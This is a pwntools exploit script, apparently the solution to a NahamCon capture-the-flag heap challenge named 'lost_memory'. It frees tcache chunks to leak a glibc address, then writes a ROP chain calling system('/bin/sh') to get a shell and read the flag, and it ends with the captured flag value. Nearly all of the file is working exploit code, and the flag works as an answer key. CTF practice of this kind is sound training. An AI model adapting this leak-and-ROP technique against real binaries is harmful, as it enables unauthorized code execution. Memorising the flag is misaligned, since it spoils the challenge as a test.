from pwn import *

context.arch = 'amd64'
context.log_level = 'debug'
context.terminal = ['tmux', 'splitw', '-h']

p = gdb.debug('./lost_memory_patched', '''
    b *0x401470
    b *0x401527
    b *0x401603
    b *0x401680
    b *0x4016d4
    continue
''')

# p = remote('challenge.nahamcon.com', 31909)

def allocate_memory(size):
    p.sendlineafter(b'Enter your choice:\n', b'1')
    p.sendlineafter(b'What size would you like?\n', str(size).encode())

def write_memory(data):
    p.sendlineafter(b'Enter your choice:\n', b'2')
    p.sendlineafter(b'What would you like to write?\n', data)
    p.recvuntil(data)
    return p.recvline().strip()

def select_index(index):
    p.sendlineafter(b'Enter your choice:\n', b'3')
    p.sendlineafter(b'Select an index to write to (0 - 9)\n ', str(index).encode())

def free_memory():
    p.sendlineafter(b'Enter your choice:\n', b'4')

def store_value():
    p.sendlineafter(b'Enter your choice:\n', b'5')
    p.recvuntil(b'Stored return value: ')
    return p.recvline().strip()

def exit():
    p.sendlineafter(b'Enter your choice:\n', b'6')

for i in range(9):
    select_index(i)
    allocate_memory(0xf8)
for i in range(8):
    select_index(i)
    free_memory()
select_index(9)
allocate_memory(0x8)
glibc_base_addr = u64(write_memory(b'A'*0x8).ljust(0x8, b'\x00')) - 0x1eccd0
log.info(f'glibc base addr: {hex(glibc_base_addr)}')

select_index(0)
allocate_memory(0x50)
select_index(1)
allocate_memory(0x50)
select_index(0)
free_memory()
select_index(1)
free_memory()
select_index(1)
store_value()

glibc_e = ELF('./libc.so.6')
glibc_r = ROP('./libc.so.6')
chain = [
    glibc_base_addr+glibc_r.rdi.address,
    glibc_base_addr+next(glibc_e.search(b'/bin/sh')),
    glibc_base_addr+glibc_r.ret.address,
    glibc_base_addr+glibc_e.symbols.system
]

select_index(2)
allocate_memory(0x50)
select_index(3)
allocate_memory(0x50)
select_index(3)
write_memory(b'A'*0x20+b''.join([p64(addr) for addr in chain])+b'A'*0xbe+b'A'*0x100+b'cat flag.txt\n')

p.interactive()

# flag{2658c992bda627329ed2a8e6225623c6}